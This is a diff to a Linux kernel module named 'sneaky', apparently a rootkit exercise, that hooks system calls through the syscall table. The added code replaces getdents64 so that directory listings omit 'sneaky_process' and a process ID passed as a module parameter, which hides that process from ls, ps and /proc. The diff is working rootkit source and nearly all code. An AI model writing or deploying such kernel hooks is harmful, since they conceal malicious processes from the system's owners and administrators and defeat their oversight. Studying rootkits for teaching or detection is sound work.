@@ -9,6 +9,7 @@
 #include <linux/kallsyms.h>
 #include <asm/page.h>
 #include <asm/cacheflush.h>
+#include <linux/dirent.h>
 
 #define PREFIX "sneaky_process"
 
@@ -65,10 +66,31 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 }
 
 //-----------------------getdents64 Function--------------------------------------------
+static char * pid = "";
+module_param(pid, charp, 0);
+
 asmlinkage int (*original_getdents64)(struct pt_regs *);
 
 asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs) {
-  return (*original_getdents64)(regs);
+  int bytes = (*original_getdents64)(regs);
+  struct linux_dirent64 * buf = (struct linux_dirent64 *)regs->si;
+  struct linux_dirent64 * d;
+  long bpos;
+  if (bytes <= 0) {
+    return bytes;
+  }
+  printk(KERN_INFO " name: %s\n", ((struct linux_dirent64 *)regs->si)->d_name);
+  for (bpos = 0; bpos < bytes;) {
+    d = (struct linux_dirent64 *) ((char *)buf + bpos);
+    if (strcmp(d->d_name, "sneaky_process") == 0 ||
+        strcmp(d->d_name, pid) == 0) {
+      memmove((char *)d, (char *)d + d->d_reclen, bytes - ((char*)d - (char*)buf) - d->d_reclen);
+      bytes -= d->d_reclen;
+      continue;
+    }
+    bpos += d->d_reclen;
+  }
+  return bytes;
 }
 
 //-----------------------read Function--------------------------------------------
@@ -123,7 +145,6 @@ static void exit_sneaky_module(void)
   sys_call_table[__NR_openat] = (unsigned long)original_openat;
   sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
   sys_call_table[__NR_read] = (unsigned long)original_read;
-
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);  
 }  
